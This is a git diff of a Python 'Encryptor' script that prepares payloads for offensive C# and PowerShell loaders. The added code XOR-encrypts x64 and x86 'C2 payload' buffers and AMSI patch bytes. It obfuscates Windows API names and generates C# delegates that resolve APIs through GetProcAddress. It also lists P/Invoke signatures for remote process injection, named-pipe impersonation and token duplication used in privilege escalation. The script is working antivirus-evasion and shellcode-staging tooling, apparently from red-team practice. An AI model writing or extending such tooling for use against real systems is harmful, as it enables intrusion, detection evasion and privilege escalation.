@@ -34,12 +34,31 @@ class Encryptor:
     # aes encryptor: 256CBC, PKCS7 padding
     @staticmethod
     def encrypt_bytes_to_bytes_aes(plain_bytes, aes_key, aes_iv):
+        # Encrypts a byte array using AES encryption with the given key.
+
+        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
+        # :param aes_key: Byte array containing the encryption key.
+        # :param aes_key: Byte array containing the initialization vector.
+        # :return: Byte array containing the encrypted data.
+
         cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend())
         encryptor = cipher.encryptor()
         padder = padding.PKCS7(algorithms.AES.block_size).padder()
         padded_data = padder.update(plain_bytes) + padder.finalize()
         encrypted = encryptor.update(padded_data) + encryptor.finalize()
         return aes_iv + encrypted
+    @staticmethod
+    def encrypt_bytes_to_bytes_xor(plain_bytes, xor_key):
+        # Encrypts a byte array using XOR encryption with the given key.
+        
+        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
+        # :param xor_key: Byte array containing the encryption key.
+        # :return: Byte array containing the encrypted data.
+
+        if not xor_key:
+            raise ValueError("Key cannot be empty.")
+        ciphertext_bytes = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(plain_bytes)])
+        return ciphertext_bytes
 
     # ------------------
     # POWERSHELL PRINTER
@@ -114,6 +133,72 @@ class Encryptor:
             encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
             print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")
 
+    # ------------------
+    # CSHARP PRINTER (XOR)
+    # ------------------
+    # print in csharp format using xor encryption
+    @staticmethod
+    def print_csharp_xor():
+        # print key, IV
+        print("public static byte[] xor_key =" + "{" + f"{Encryptor.to_csharp_byte_array(xor_key)}" + "};")
+        
+        # print encrypted data
+        # x64 C2 payload
+        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf, xor_key)
+        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")
+
+        # x86 C2 payload
+        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf86, xor_key)
+        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")
+
+        # print unencrypted buf sizes (encrypted buf size is different)
+        print(f"public static int sBuf = {len(buf)};")
+        print(f"public static int sBuf86 = {len(buf86)};")
+
+        # amsi patches
+        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
+            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(patch_bytes, xor_key)
+            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")
+
+        # api names
+        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
+        for api_name, api_bytes in API_NAME_MAP.items():
+            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(api_bytes, xor_key)
+            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")
+
+    # ------------------
+    # CSHARP DELEGATE PRINTER
+    # ------------------
+    # print csharp delegates (getprocaddress, getmodulehandle)
+    @staticmethod
+    def print_csharp_delegates(pinvoke_signatures):
+        for signature in pinvoke_signatures:
+            lines = signature.split('\n')
+            if len(lines) != 2:
+                print("Invalid P/Invoke signature format. It should have exactly 2 lines.")
+                continue
+            
+            # Parse DllImport lines
+            attributes_line = lines[0].strip()
+            method_signature = lines[1].strip()
+            
+            #method_parts = method_signature.split(' ')
+            
+            # Parse variables
+            data_type = method_signature.split(" ")[2]
+            api_name = method_signature.split(" ")[4].split("(")[0]
+            parameters = method_signature.split("(")[1].split(")")[0]
+            dll_name = attributes_line.split('"')[1]
+            
+
+            # Generate C# code
+            delegate_code = (
+                f"\\\\\\\\ import {api_name.upper()}\n"
+                f"public delegate {data_type} p{api_name}({parameters});\n"
+                f"public static p{api_name} {api_name} = (p{api_name})Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(\"{dll_name}\"), DecryptBytesToStringAes({api_name}_Bytes, AesKey)), typeof(p{api_name}));\n\n"
+            )
+            print(delegate_code)
+
 # ------------------
 # Configuration Section
 # ------------------
@@ -151,9 +236,77 @@ API_NAMES = [
     "GetStdHandle",
     "MiniDumpWriteDump",
     "amsi.dll",
-    "NtTraceEvent"
+    "NtTraceEvent",
+    "CreateNamedPipe",
+    "ConnectNamedPipe",
+    "ImpersonateNamedPipeClient",
+    "GetCurrentThread",
+    "OpenThreadToken",
+    "GetTokenInformation",
+    "ConvertSidToStringSid",
+    "DuplicateTokenEx",
+    "CreateProcessWithTokenW"
 ]
 API_NAME_MAP = {api: api.encode() for api in API_NAMES}
+
+pinvoke_signatures = [
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);''',
+    '''[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, int processId);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
+    '''[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint ResumeThread(IntPtr hThread);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr FlsAlloc(IntPtr callback);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern IntPtr LoadLibraryA(string name);''',
+    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    public static extern int VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetStdHandle(int nStdHandle);''',
+    '''[DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);''',
+    '''[DllImport("Advapi32.dll")]
+    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);''',
+    '''[DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentThread();''',
+    '''[DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);''',
+    '''[DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);''',
+    '''[DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);''',
+    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);''',
+    '''[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);'''
+]
 
 # ------------------
 # Main Function
@@ -164,15 +317,21 @@ def main():
     parser = argparse.ArgumentParser(description="Encryptor Script")
     # Add arguments
     parser.add_argument("-csharp", action="store_true", help="Print the output in C# format.")
+    parser.add_argument("-csdelegates", action="store_true", help="Print win32 api delegates in C# format.")
     parser.add_argument("-powershell", action="store_true", help="Print the output in PowerShell format.")
+    parser.add_argument("-xor", action="store_true", help="Print the output in C# format using XOR encryption.")
 
     # Parse the arguments
     args = parser.parse_args()
 
     if args.csharp:
         Encryptor.print_csharp()
+    elif args.xor:
+        Encryptor.print_csharp_xor()
     elif args.powershell:
         Encryptor.print_powershell()
+    elif args.csdelegates:
+        Encryptor.print_csharp_delegates(pinvoke_signatures)
     else:
         Encryptor.print_powershell()
 
@@ -180,6 +339,7 @@ if __name__ == "__main__":
     # generate keys
     aes_key = Encryptor.generate_key_aes()
     aes_iv = Encryptor.generate_iv_aes()
+    xor_key = b".pdata"
     
     main()
 
@@ -189,4 +349,5 @@ if __name__ == "__main__":
 
 # add -c format
 # add -vba format (decimal)
+# add powershell delegates
 # refactor functions to make them more efficient/flexible
